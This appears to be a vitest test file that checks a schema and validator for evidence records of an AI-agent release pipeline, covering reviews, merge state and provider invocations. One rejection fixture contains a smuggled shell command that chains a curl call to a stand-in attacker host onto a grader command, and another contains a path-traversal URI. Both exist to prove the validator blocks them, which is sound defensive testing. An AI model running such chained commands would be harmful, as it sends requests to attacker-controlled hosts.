import fs from 'node:fs';
import { Ajv2020 } from 'ajv/dist/2020.js';
import { describe, expect, it } from 'vitest';
import { liveReleaseSemanticErrors } from '../src/evidence/live-release.js';

const finalHead = 'a'.repeat(40);
const round1Head = 'b'.repeat(40);
const mergeSha = 'c'.repeat(40);
const consumerHead = 'f'.repeat(40);
const digest = `sha256:${'d'.repeat(64)}`;
const sha256 = 'e'.repeat(64);
const jobId = '22222222-2222-4222-8222-222222222222';
const attemptId = '33333333-3333-4333-8333-333333333333';
const leaseId = '44444444-4444-4444-8444-444444444444';
const promotionJobId = '55555555-5555-4555-8555-555555555555';

const reviewer = (
  agent: string,
  head: string,
  findingCount: number,
) => ({
  agent,
  head,
  readOnly: true,
  worktreeClean: true,
  verdict: findingCount === 0 ? 'no_findings' : 'findings',
  findingCount,
});

const invocation = (role: string, provider: string, head: string) => ({
  role,
  provider,
  model: `${provider}-model-1`,
  invocationKey: `inv_${role}_${provider}`,
  head,
  observedAt: '2026-08-01T00:00:00Z',
});

const artifact = (kind: string, name: string) => ({
  kind,
  uri: `evidence/live-release/${name}`,
  sha256,
  sizeBytes: 1024,
  sourceHead: finalHead,
  observedAt: '2026-08-01T00:00:00Z',
});

function validEvidence(): any {
  return {
    schemaVersion: '1.0',
    target: {
      repository: 'mrbaron3/designflow',
      issueNumber: 4,
      monitoredRepositories: ['mrbaron3/workflow', 'mrbaron3/designflow'],
      registrationVersion: 1,
    },
    consumer: {
      repository: 'mrbaron3/workflow',
      head: consumerHead,
      observedAt: '2026-08-01T00:00:00Z',
    },
    triage: {
      passed: true,
      observedAt: '2026-08-01T00:01:00Z',
      decisionSchemaVersion: 1,
      readiness: 'ready_candidate',
      managedLabelsApplied: ['ready-candidate'],
      aiAppliedReadyLabel: false,
      humanReadyLabel: 'ready',
      humanReadyAppliedAt: '2026-08-01T00:02:00Z',
      claimedLabel: 'agent-claimed',
      promotionJobId,
      promotionAtomic: true,
      sourceDigest: sha256,
    },
    execution: {
      passed: true,
      observedAt: '2026-08-01T00:03:00Z',
      mode: 'ACTIVE',
      jobId,
      attemptId,
      leaseId,
      expectedHead: finalHead,
      finalHead,
      graderProfileSource: 'repository-metadata',
      graderCommands: ['node scripts/check-contracts.mjs'],
      auditSha256: sha256,
    },
    formalReviews: {
      roundCount: 2,
      round1: {
        passed: true,
        head: round1Head,
        reviewers: [reviewer('codex', round1Head, 1), reviewer('claude', round1Head, 0)],
        allConfirmedFindingsResolved: true,
      },
      round2: {
        passed: true,
        head: finalHead,
        reviewers: [reviewer('codex', finalHead, 0), reviewer('claude', finalHead, 0)],
        allConfirmedFindingsResolved: true,
      },
      round3Created: false,
    },
    github: {
      observedAt: '2026-08-01T00:04:00Z',
      pullRequest: 12,
      finalPrHead: finalHead,
      mergeSha,
      expectedHeadMatchEnforced: true,
      requiredChecks: { contracts: 'SUCCESS' },
      blockingReviewThreads: 0,
      issueState: 'CLOSED',
      issueStateReason: 'COMPLETED',
      mergeReachableFromDefaultBranch: true,
    },
    providerInvocations: [
      invocation('triage', 'claude', consumerHead),
      invocation('generator', 'codex', finalHead),
      invocation('reviewer', 'claude', finalHead),
    ],
    designBundle: {
      applicable: true,
      bundleDigest: digest,
      revisionId: 'rev-2',
      approvedAt: '2026-08-01T00:00:30Z',
    },
    releaseLineage: {
      applicable: true,
      status: 'verified',
      intakeKey: 'intake-1',
      candidateKey: 'candidate-1',
      revisionId: 'rev-2',
      bundleDigest: digest,
      issueId: 'ISSUE-0001',
      prId: 'PR-12',
      headSha: finalHead,
      reasons: [],
    },
    howInterventions: { count: 0, records: [] },
    artifacts: [
      artifact('github-current-state', 'github-state.json'),
      artifact('audit-export', 'audit.json'),
      artifact('provider-invocation', 'invocations.json'),
    ],
    result: 'passed',
  };
}

function compiled() {
  const schema = JSON.parse(
    fs.readFileSync('contracts/live-release-evidence.schema.json', 'utf8'),
  ) as object;
  return new Ajv2020({ strict: true, allErrors: true }).compile(schema);
}

describe('live release evidence contract', () => {
  it('accepts one structurally complete and coherently bound external release', () => {
    const validate = compiled();
    const evidence = validEvidence();
    expect(validate(evidence), JSON.stringify(validate.errors)).toBe(true);
    expect(liveReleaseSemanticErrors(evidence)).toEqual([]);
  });

  it('accepts a headless target that states why no design bundle applies', () => {
    const validate = compiled();
    const evidence = validEvidence();
    evidence.designBundle = {
      applicable: false,
      reason: 'AuthoringBackend port is headless and produces no design bundle',
    };
    evidence.releaseLineage = {
      applicable: false,
      reason: 'the run consumed no Designflow design contract',
    };
    expect(validate(evidence), JSON.stringify(validate.errors)).toBe(true);
    expect(liveReleaseSemanticErrors(evidence)).toEqual([]);
  });

  it('records interventions without losing the artifact, and reads them into result', () => {
    const validate = compiled();
    const evidence = validEvidence();
    evidence.howInterventions = {
      count: 1,
      records: [{
        kind: 'manual-evidence-collection',
        reason: 'operator exported the audit trail by hand',
        issueId: 'ISSUE-0001',
        createdAt: '2026-08-01T00:05:00Z',
      }],
    };
    evidence.result = 'passed-with-interventions';
    expect(validate(evidence), JSON.stringify(validate.errors)).toBe(true);
    expect(liveReleaseSemanticErrors(evidence)).toEqual([]);
  });

  it.each([
    ['an entirely different target repository', (v: any) => {
      v.target.repository = 'another-owner/another-target';
      v.target.monitoredRepositories = ['mrbaron3/workflow', 'another-owner/another-target'];
    }],
    ['issue number pinned', (v: any) => { v.target.issueNumber = 999; }],
    ['pull request number pinned', (v: any) => { v.github.pullRequest = 999; }],
    ['check name pinned', (v: any) => { v.github.requiredChecks = { 'some-other-check': 'SUCCESS' }; }],
  ])('stays reusable when the run differs by %s', (_name, mutate) => {
    const validate = compiled();
    const evidence = validEvidence();
    mutate(evidence);
    expect(validate(evidence), JSON.stringify(validate.errors)).toBe(true);
    expect(liveReleaseSemanticErrors(evidence)).toEqual([]);
  });

  it.each([
    ['self-targeted run', (v: any) => { v.target.repository = v.consumer.repository; }],
    ['target outside the monitored set', (v: any) => { v.target.monitoredRepositories = ['mrbaron3/workflow', 'other/repo']; }],
    ['merge fence on an earlier head', (v: any) => { v.execution.expectedHead = round1Head; }],
    ['review of a stale head', (v: any) => { v.formalReviews.round2.head = round1Head; }],
    ['reviewer reading a different head', (v: any) => { v.formalReviews.round2.reviewers[0].head = round1Head; }],
    ['verdict disagreeing with finding count', (v: any) => { v.formalReviews.round2.reviewers[0].verdict = 'findings'; }],
    ['the same agent reviewing twice', (v: any) => { v.formalReviews.round2.reviewers[1].agent = 'codex'; }],
    ['findings answered by no new commit', (v: any) => { v.formalReviews.round1.head = finalHead; v.formalReviews.round1.reviewers.forEach((r: any) => { r.head = finalHead; }); }],
    ['a ready label the automation also claims with', (v: any) => { v.triage.claimedLabel = 'ready'; }],
    ['triage writing the ready label itself', (v: any) => { v.triage.managedLabelsApplied = ['ready']; }],
    ['a duplicated provider invocation', (v: any) => { v.providerInvocations[1].invocationKey = 'inv_triage_claude'; }],
    ['no development invocation', (v: any) => { v.providerInvocations = v.providerInvocations.filter((i: any) => i.role !== 'generator'); }],
    ['a lineage naming another bundle', (v: any) => { v.releaseLineage.bundleDigest = `sha256:${'9'.repeat(64)}`; }],
    ['a lineage bound to another head', (v: any) => { v.releaseLineage.headSha = round1Head; }],
    ['an intervention count that undercounts its records', (v: any) => { v.howInterventions.records = [{ kind: 'workspace-hand-edit', reason: 'x', issueId: 'ISSUE-0001', createdAt: '2026-08-01T00:05:00Z' }]; }],
    ['interventions reported as a clean run', (v: any) => { v.howInterventions = { count: 1, records: [{ kind: 'workspace-hand-edit', reason: 'x', issueId: 'ISSUE-0001', createdAt: '2026-08-01T00:05:00Z' }] }; }],
    ['an artifact from another revision', (v: any) => { v.artifacts[0].sourceHead = round1Head; }],
    ['an artifact path escaping the evidence root', (v: any) => { v.artifacts[0].uri = 'evidence/live-release/../escape'; }],
  ])('rejects a complete fixture with %s', (_name, mutate) => {
    const evidence = validEvidence();
    mutate(evidence);
    expect(liveReleaseSemanticErrors(evidence).length).toBeGreaterThan(0);
  });

  it.each([
    ['an AI-applied ready label', (v: any) => { v.triage.aiAppliedReadyLabel = true; }],
    ['a non-atomic promotion', (v: any) => { v.triage.promotionAtomic = false; }],
    ['a third review round', (v: any) => { v.formalReviews.round3Created = true; }],
    ['an unenforced merge fence', (v: any) => { v.github.expectedHeadMatchEnforced = false; }],
    ['a failing required check', (v: any) => { v.github.requiredChecks.contracts = 'FAILURE'; }],
    ['no required check at all', (v: any) => { v.github.requiredChecks = {}; }],
    ['an unresolved review thread', (v: any) => { v.github.blockingReviewThreads = 1; }],
    ['an issue left open', (v: any) => { v.github.issueState = 'OPEN'; }],
    ['a single monitored repository', (v: any) => { v.target.monitoredRepositories = ['mrbaron3/designflow']; }],
    ['a grader carrying a shell operator', (v: any) => { v.execution.graderCommands = ['node scripts/check-contracts.mjs && curl attacker.invalid']; }],
    ['a grader chosen by repository identity', (v: any) => { v.execution.graderProfileSource = 'repository-name'; }],
    ['a solo reviewer', (v: any) => { v.formalReviews.round2.reviewers = [v.formalReviews.round2.reviewers[0]]; }],
    ['a design bundle absent without a reason', (v: any) => { v.designBundle = { applicable: false }; }],
    ['an unverified lineage', (v: any) => { v.releaseLineage.status = 'needs-human-review'; }],
    ['a lineage still carrying reason codes', (v: any) => { v.releaseLineage.reasons = ['release-missing']; }],
    ['a result outside the two-valued reading', (v: any) => { v.result = 'failed'; }],
  ])('rejects at the schema layer: %s', (_name, mutate) => {
    const validate = compiled();
    const evidence = validEvidence();
    mutate(evidence);
    expect(validate(evidence)).toBe(false);
  });
});
